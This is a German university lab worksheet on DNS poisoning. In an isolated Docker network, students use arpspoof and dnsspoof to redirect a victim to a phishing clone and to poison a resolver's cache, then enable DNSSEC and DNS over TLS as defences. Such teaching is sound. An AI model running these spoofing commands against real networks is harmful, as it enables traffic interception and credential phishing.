# lab05 – DNS Poisoning: Wem gehört dieser Name?

| | |
|---|---|
| **Modul** | Sichere Netzwerke |
| **Hochschule** | FOM Hochschule für Oekonomie & Management |
| **Semester** | Sommersemester 2026 |
| **Dauer** | ca. 90 Minuten |
| **Voraussetzungen** | Docker + Docker Compose, Git Bash / WSL2-Terminal, lab02 (ARP Spoofing) bekannt |

---

## Worum geht es?

Du tippst `bank.local` in den Browser und vertraust darauf, dass dahinter der richtige Server steht. Aber *wer* beantwortet eigentlich die Frage „Welche IP-Adresse gehört zu diesem Namen?" — und was passiert, wenn die Antwort gefälscht ist?

In diesem Lab beobachtest du an einer kleinen, vollständig isolierten Bank-Umgebung, wie sich Namensauflösung manipulieren lässt — an zwei unterschiedlichen Stellen, mit zwei sehr unterschiedlichen Folgen. Anschließend baust du die Gegenmaßnahme selbst ein.

---

## Lernziele

- Den Weg einer DNS-Anfrage praktisch nachvollziehen: Client → Resolver → autoritativer Server
- Die Rolle von **Cache** und **TTL** beim Angriff verstehen
- Den Unterschied zwischen einer Manipulation am Client und einer am Resolver erkennen
- DNSSEC als wirksame Gegenmaßnahme aktivieren und ihre Wirkung beobachten
- Einschätzen, *welche* Manipulation DNSSEC verhindert — und welche nicht

---

## Topologie

```
                    lab05-net  (10.50.0.0/24)

   victim .10 ─┐                              ┌─ web-real  .20  (echtes Portal)
   victim2 .11 ─┤        resolver .53         │
               ├──────── (unbound) ───────────┤
   attacker .66┘        auth-dns  .54         └─ web-fake  .99  (Phishing-Klon)
                        (nsd, bank.local)

   Alle Knoten liegen im selben L2-Segment.
```

| Knoten | IP | Rolle |
|---|---|---|
| victim | 10.50.0.10 | dein Hauptopfer (nutzt resolver als DNS) |
| victim2 | 10.50.0.11 | zweiter Client (für den Cache-Effekt) |
| resolver | 10.50.0.53 | rekursiver, cachender Resolver |
| auth-dns | 10.50.0.54 | autoritativer Server für `bank.local` |
| web-real | 10.50.0.20 | das echte Banking-Portal |
| web-fake | 10.50.0.99 | der Phishing-Server des Angreifers |
| attacker | 10.50.0.66 | dein Angriffssystem |

---

## Aufgabe 1 – Lab starten

```bash
chmod +x setup.sh teardown.sh
./setup.sh
```

Das Skript erstellt das Netz, startet alle Container, rüstet den Angreifer aus und zeigt am Ende eine Übersicht. Die fertigen Angriffsbefehle stehen zusätzlich in `.attack-cmds`.

> **Leitfrage:** Wie viele eigenständige DNS-Rollen gibt es in diesem Netz — und welche davon vertraut welcher anderen blind?

```
_______________________________________________________
_______________________________________________________
```

---

## Aufgabe 2 – Ausgangszustand dokumentieren

Bevor du angreifst: Wie sieht die *korrekte* Welt aus?

```bash
docker exec lab05-victim getent ahostsv4 bank.local
docker exec lab05-victim curl -4 -s bank.local | grep -E "badge|Server:"
```

Notiere die IP-Adresse, die `bank.local` zurückliefert, und welche Seite ausgeliefert wird:

```
IP von bank.local: ______________________
Seite (real/fake): ______________________
```

> 🎓 **Beobachtungsaufgabe:** Halte diese IP gut fest. Der Vergleich mit dem Zustand *nach* dem Angriff ist der zentrale Moment dieses Labs.

> ℹ️ `getent ahostsv4` nutzt denselben Auflösungsweg wie jede normale Anwendung (Browser, curl, …) — also den eingetragenen Resolver `10.50.0.53`.

---

## Aufgabe 3 – Szenario A

Öffne **drei Terminals** auf dem Host. In Terminal 1 und 2 läuft je eine Richtung des ARP-Spoofings, in Terminal 3 die DNS-Fälschung.

**Terminal 1**

```bash
docker exec -it lab05-attacker arpspoof -i eth0 -t 10.50.0.10 10.50.0.53
```

**Terminal 2**

```bash
docker exec -it lab05-attacker arpspoof -i eth0 -t 10.50.0.53 10.50.0.10
```

**Terminal 3**

```bash
docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
```

Jetzt löst das Opfer erneut auf (viertes Terminal):

```bash
docker exec lab05-victim getent ahostsv4 bank.local
docker exec lab05-victim curl -4 -s bank.local | grep -E "badge|Server:"
```

Prüfe danach das **zweite** Opfer:

```bash
docker exec lab05-victim2 getent ahostsv4 bank.local
```

> **Leitfrage:** `victim` landet jetzt auf der falschen Seite — aber was zeigt `victim2`? Was sagt das über die *Reichweite* dieses Angriffs aus?

```
victim  -> ______________________
victim2 -> ______________________
```

> ℹ️ Stoppe alle drei Angriffs-Terminals mit `Strg+C`, bevor du zu Aufgabe 4 gehst. Beobachte, ob `victim` danach wieder die richtige Seite bekommt.

---

## Aufgabe 4 – Szenario B

Jetzt greift der Angreifer eine Stelle weiter „oben" an — zwischen `resolver` und `auth-dns`. Zuerst den Cache leeren, damit der Effekt sauber sichtbar wird:

```bash
docker exec lab05-resolver unbound-control flush_zone bank.local.
```

Drei Terminals — Terminal 1 und 2 für das ARP-Spoofing zwischen Resolver und autoritativem Server, Terminal 3 für die DNS-Fälschung.

**Terminal 1**

```bash
docker exec -it lab05-attacker arpspoof -i eth0 -t 10.50.0.53 10.50.0.54
```

**Terminal 2**

```bash
docker exec -it lab05-attacker arpspoof -i eth0 -t 10.50.0.54 10.50.0.53
```

**Terminal 3**

```bash
docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
```

`victim` stellt **eine** Anfrage — die den Resolver zwingt, beim autoritativen Server nachzufragen:

```bash
docker exec lab05-victim getent ahostsv4 bank.local
```

Schau in den Cache des Resolvers:

```bash
docker exec lab05-resolver unbound-control dump_cache | grep bank.local
```

Jetzt **stoppe den kompletten Angriff** (`Strg+C` in allen drei Terminals) und frage mit dem **bisher unbeteiligten** `victim2`:

```bash
docker exec lab05-victim2 getent ahostsv4 bank.local
```

> **Leitfrage:** Der Angriff ist längst beendet — warum bekommt `victim2` trotzdem die falsche IP? Worin unterscheidet sich diese Manipulation grundlegend von Szenario A?

```
dump_cache zeigt: ____________________________________
victim2 nach Angriffsende -> ________________________
Unterschied A vs. B: ________________________________
_______________________________________________________
```

> 🎓 **Beobachtungsaufgabe:** Notiere die TTL des vergifteten Cache-Eintrags. Genau so lange bleibt der Angriff wirksam — ganz ohne dass der Angreifer noch im Netz sein muss.

---

## Aufgabe 5 – Szenario C

Du bist jetzt die Verteidigung. Schalte am Resolver die Signaturprüfung ein:

```bash
docker exec lab05-resolver /scripts/enable-dnssec.sh
```

Wiederhole **Szenario B** (Cache ist durch das Skript bereits geleert). Lass dann das Opfer auflösen — diesmal mit `dig`, um den Status zu sehen:

```bash
docker exec lab05-victim dig @10.50.0.53 bank.local
```

Und zum Vergleich, was *ohne* Prüfung durchgekommen wäre:

```bash
docker exec lab05-victim dig @10.50.0.53 bank.local +cd +short
```

> **Leitfrage:** Was liefert der Resolver jetzt statt der falschen IP? Und was zeigt die `+cd`-Abfrage (`cd` = *checking disabled*) — was sagt der Unterschied über die Wirkungsweise von DNSSEC aus?

```
ohne +cd  -> ______________________
mit  +cd  -> ______________________
```

> 🎓 **Beobachtungsaufgabe (wichtig):** Aktiviere mit aktivem DNSSEC noch einmal **Szenario A** (Angriff direkt am Client). Wird `victim` immer noch getäuscht? Überlege, *warum* — wer prüft hier eigentlich die Signatur, und wer nicht?

> ℹ️ **Bonus – DNS over TLS:** `docker exec lab05-resolver /scripts/enable-dot.sh` aktiviert einen verschlüsselten DNS-Listener. Eine über TLS gestellte Anfrage kann der Angreifer weder mitlesen noch fälschen — das schließt die Lücke aus Szenario A. Schau dir mit `docker exec -it lab05-attacker tcpdump -i eth0 -A port 853` an, was der Angreifer dabei noch sieht.

---

## Reflexionsfragen

**F1.** Vergib jeweils den korrekten Fachbegriff: Wie heißt die Manipulation aus **Szenario A**, und wie die aus **Szenario B**? Begründe die Unterscheidung in einem Satz.

```
_______________________________________________________
_______________________________________________________
```

**F2.** Szenario B wirkt über das Angriffsende hinaus, Szenario A nicht. Welche DNS-Eigenschaft ist dafür verantwortlich, und welche Rolle spielt die TTL?

```
_______________________________________________________
_______________________________________________________
```

**F3.** DNSSEC stoppt Szenario B, aber nicht ohne Weiteres Szenario A. Erkläre, woran das liegt — und was zusätzlich nötig ist, um auch den Client-nahen Angriff zu verhindern.

```
_______________________________________________________
_______________________________________________________
```

**F4.** In deinem beruflichen Umfeld: An welchen Stellen wird Namensauflösung betrieben (interne Resolver, öffentliche Resolver, Geräte mit hartem DNS-Eintrag)? Wo wäre ein solcher Angriff am wirkungsvollsten?

```
_______________________________________________________
_______________________________________________________
_______________________________________________________
```

**F5.** Beide Angriffe setzten voraus, dass der Angreifer sich in den Pfad bringen konnte (wie in lab02). Welche Maßnahme *unterhalb* von DNS würde dem Angreifer schon diese Ausgangsposition nehmen?

```
_______________________________________________________
_______________________________________________________
```

---

## Cleanup

```bash
./teardown.sh
```

---

<details>
<summary>Quiz: Warum genügt es nicht, nur den autoritativen Server abzusichern, um Clients vor falschen Antworten zu schützen?</summary>

<strong>Antwort:</strong> Weil zwischen Client und autoritativem Server mehrere Stationen liegen — vor allem der rekursive Resolver und die „letzte Meile" zwischen Resolver und Stub-Resolver des Clients. DNSSEC sichert die Kette vom autoritativen Server bis zum <em>validierenden</em> Resolver: Eine gefälschte, unsignierte Antwort wird dort als ungültig verworfen (Szenario B scheitert). Der normale Stub-Resolver eines Clients validiert jedoch selbst nicht — er vertraut „seinem" Resolver. Sitzt der Angreifer direkt zwischen Client und Resolver (Szenario A), kann er weiterhin eine gefälschte Antwort einschleusen, weil der Client die Signatur gar nicht prüft. Erst ein validierender Stub oder ein verschlüsselter, authentifizierter Transportweg (DoT/DoH) schließt auch diese Lücke.

</details>

---

*Lab 05 | Sichere Netzwerke | FOM Hochschule | SS 2026*